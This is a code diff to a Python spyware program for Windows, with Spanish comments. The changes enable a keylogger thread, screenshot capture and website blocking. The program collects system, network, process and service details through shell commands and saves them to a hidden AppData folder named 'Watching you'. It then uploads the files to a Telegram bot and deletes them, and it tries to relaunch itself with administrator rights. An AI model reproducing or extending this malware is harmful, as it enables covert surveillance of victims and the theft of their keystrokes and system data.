@@ -4,6 +4,7 @@
 import ctypes
 import os
 
+from PIL import ImageGrab
 from pynput.keyboard import Listener  # Escucha eventos del teclado
 
 import socket  # Verifica internet
@@ -16,7 +17,7 @@ import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
 #import shutil
-from PIL import ImageGrab  # Toma capturas de pantalla
+#from PIL import ImageGrab  # Toma capturas de pantalla
 
 # region Config
 class Config:
@@ -24,6 +25,7 @@ class Config:
         self.USERNAME = str(os.getlogin())
         self.DELAY = 2  # Seconds
         self.DEBUG = True  # Show data in console
+        self.TEMP = r"C:\Users\HackSendTo\AppData\Roaming\Watching you\temp data"
 
     class TelegramBot:
         def __init__(self):
@@ -77,6 +79,13 @@ class Util:
                 lst += [i]
         return lst
 
+    def save_file(self, path, text, mode = "a"):
+        subPath = path[0:path.rfind("\\")]  # Recorta el path, y obtiene el sub path
+        self.create_folder(subPath)
+        print(subPath)
+        file = open(path, mode)
+        file.write(text)
+        file.close()
 
 class Screenshot:
     def _delete(self, name):
@@ -453,7 +462,7 @@ class PCInformation:
 
     @staticmethod
     def __CMD_command(title, command):
-        response = title + "\n"
+        response = title + "\n" + Util().current_time()+"\n"
         lines = os.popen(command)
         for line in lines:
             line.replace('\n\n', '\n')
@@ -484,6 +493,7 @@ class PCInformation:
         return self.__CMD_command(
             title="Information: Taks List",
             command="TASKLIST")
+
     def __service_active(self):
         return self.__CMD_command(
             title="Information: Services active",
@@ -506,43 +516,44 @@ class PCInformation:
         bot = telepot.Bot(Config.TelegramBot().TOKEN)
         chat_id = Config.TelegramBot().ID[0]
 
-        send = [self.__display_dns(),
-                self.__red_info(),
-                self.__ip_config(),
-                self.__system_info(),
-                self.__driver_info(),
-                self.__taks_list(),
-                self.__service_active()]
-        for i in send:
-            try:
-                bot.sendChatAction(chat_id, 'typing')
-                print(i)
-                responses = Util().split_string(3900, i)
-                for resp in responses:
-                    time.sleep(2)
-                    bot.sendMessage(chat_id, resp)
-                else:
-                    pass
-            except:
-                pass
-        else:
-            pass
+        data = {
+            "Información del DNS":      self.__display_dns(),
+            "Información de la RED":    self.__red_info(),
+            "Configuración del IP":     self.__ip_config(),
+            "Información del sistema":  self.__system_info(),
+            "Información de los controladores":   self.__driver_info(),
+            "Programas ejecutandose":    self.__taks_list(),
+            "Servicios ejecutandose":  self.__service_active()
+        }
+        paths = []
+        for name, value in data.items():
+            path = Config().TEMP +'\\' + name +'.txt'
+            paths.append(path)
+            Util().save_file(path, value)
+
+            bot.sendChatAction(chat_id, 'typing')
+            bot.sendDocument(chat_id, open(path, 'rb'), Util().current_time())
+            time.sleep(5)
+            os.remove(path)
+
 
 
 if __name__ == '__main__':
     # Verifica permisos de admistrador: Administrador
+
+    # threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
+
     print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
-    #threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
-    threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
-    #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+    threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+    #threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
+    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
     #threading.Thread(target=StartUp().infinite).start()
 
-    #threading.Thread(target=PCInformation().send).start()
+    threading.Thread(target=PCInformation().send).start()
 
-    #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-    #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
-    
-    """
+    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+
+
     if is_admin():
         # Code of your program here
         print("ya eres admin prro")
@@ -550,4 +561,3 @@ if __name__ == '__main__':
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
         print("no sos admin pibe")
-    """
